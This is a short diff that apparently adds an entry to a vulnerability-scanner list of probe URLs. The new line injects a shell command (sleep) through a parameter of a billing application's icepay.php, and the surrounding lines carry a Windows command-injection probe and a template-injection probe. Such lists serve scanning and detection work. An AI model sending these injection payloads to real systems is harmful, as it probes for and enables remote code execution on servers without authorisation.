@@ -89,3 +89,4 @@
 /scrm/crm/admin
 /?search==%00{.exec|cmd.exe+/c+ping+127.0.0.1+-n+10.}
 /?id=nuclei%25{128*128}
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};sleep%207;#
